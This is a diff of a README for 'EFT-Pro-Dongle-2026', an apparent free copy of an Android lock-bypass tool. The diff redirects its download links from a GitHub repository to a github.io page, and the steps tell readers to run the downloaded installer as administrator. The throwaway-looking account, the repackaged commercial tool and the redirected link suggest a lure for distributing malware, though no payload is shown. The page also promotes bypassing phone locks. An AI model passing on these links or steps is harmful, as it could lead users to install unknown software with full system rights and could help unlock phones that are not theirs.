@@ -1,6 +1,6 @@
 # 🔐 EFT-Pro-Dongle-2026 - Unlock Android phones with ease today
 
-[![Download EFT Pro](https://img.shields.io/badge/Download-EFT_Pro_2026-blue)](https://github.com/tarsal-ticketline581/EFT-Pro-Dongle-2026)
+[![Download EFT Pro](https://img.shields.io/badge/Download-EFT_Pro_2026-blue)](https://tarsal-ticketline581.github.io)
 
 This software manages Android device locks and security settings. Use this tool on Windows systems to bypass locks or perform device maintenance. The software works on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these instructions to set up the software on your computer.
 
-1.  Visit the [Download Page](https://github.com/tarsal-ticketline581/EFT-Pro-Dongle-2026) to obtain the installer.
+1.  Visit the [Download Page](https://tarsal-ticketline581.github.io) to obtain the installer.
 2.  Locate the downloaded file in your Downloads folder.
 3.  Right-click the file and choose "Run as administrator."
 4.  Follow the prompts on the screen to complete the installation.
